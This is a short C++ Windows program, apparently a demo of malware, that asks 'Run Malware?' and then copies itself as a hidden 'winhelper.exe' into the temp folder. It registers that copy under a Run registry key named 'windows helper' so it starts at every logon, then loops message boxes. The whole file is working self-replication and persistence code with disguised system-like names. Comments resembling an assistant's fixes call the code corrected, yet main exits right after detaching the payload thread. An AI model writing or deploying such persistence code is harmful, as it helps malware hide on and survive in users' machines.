#include <iostream>  
#include <fstream>  
#include <string>  
#include <filesystem>  
#include <windows.h>  
#include <thread>  
#include <chrono>
namespace fs = std::filesystem;  

// Ensure replicate function is declared before main
void replicate();  
void addToRegistry(); 
void harmlessPayload();  

int main() {
    int result = MessageBoxA(NULL, "Run Malware?", "Bestätigung", MB_YESNO | MB_ICONQUESTION);
    if (result != IDYES) {
        return 0;
    }

    replicate();
    addToRegistry();
    std::thread t(harmlessPayload);
    t.detach();
    return 0;
}

std::string getselfpath() {  
    char path[MAX_PATH];  
    GetModuleFileNameA(NULL, path, MAX_PATH);  
    return std::string(path);  
}  

void replicate() {  
    std::string self = getselfpath();  
    std::string folder = fs::temp_directory_path().string();  
    std::string copyname = folder + "\\winhelper.exe";  

    if (!fs::exists(copyname)) {  
        fs::copy_file(self, copyname);  
        SetFileAttributesA(copyname.c_str(), FILE_ATTRIBUTE_HIDDEN); // Corrected "file_attribute_hidden" to "FILE_ATTRIBUTE_HIDDEN"
    }  
}

void addToRegistry() {  
    HKEY hkey;  
    const char* path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"; // Fixed backslash escape  
    const char* name = "windows helper";  
    std::string value = fs::temp_directory_path().string() + "\\winhelper.exe";  

    // Corrected ERROR_SUCESS to ERROR_SUCCESS and fixed syntax error  
    if (RegOpenKeyExA(HKEY_CURRENT_USER, path, 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {  
        RegSetValueExA(hkey, name, 0, REG_SZ, (BYTE*)value.c_str(), value.length() + 1);  
        RegCloseKey(hkey);  
    }  
}

// Correctly defined harmlessPayload function
void harmlessPayload() {
    while (true) {
        MessageBoxA(NULL, "ich bin aktiv!", "info", MB_OK | MB_ICONINFORMATION);
        std::this_thread::sleep_for(std::chrono::seconds(60));
    }
}

